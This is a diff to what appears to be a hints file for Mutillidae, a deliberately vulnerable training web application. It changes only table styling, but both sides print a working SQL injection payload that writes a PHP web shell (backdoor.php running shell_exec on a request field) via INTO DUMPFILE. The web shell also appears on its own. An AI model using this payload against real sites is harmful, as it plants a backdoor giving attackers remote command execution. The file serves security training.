@@ -699,10 +699,10 @@ Using advanced techniques: Writing files to operating system
 	Page: user-info.php
 	Field: username
 	Values:
-		' union select null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '..\\..\\htdocs\\mutillidae\\backdoor.php' -- 
+		' union select null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><table><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>' INTO DUMPFILE '..\\..\\htdocs\\mutillidae\\backdoor.php' -- 
 		
 <form action="" method="post" enctype="application/x-www-form-urlencoded">		
-	<table style="margin-left:auto; margin-right:auto;">
+	<table>
 		<tr>
 			<td colspan="2">Please enter system command</td>
 		</tr>
@@ -725,7 +725,7 @@ Using advanced techniques: Writing files to operating system
 	echo "</pre>";	
 ?>
 
-<form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>
+<form action="" method="post" enctype="application/x-www-form-urlencoded"><table><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?>
 
 
 Using advanced techniques: Insert Injection
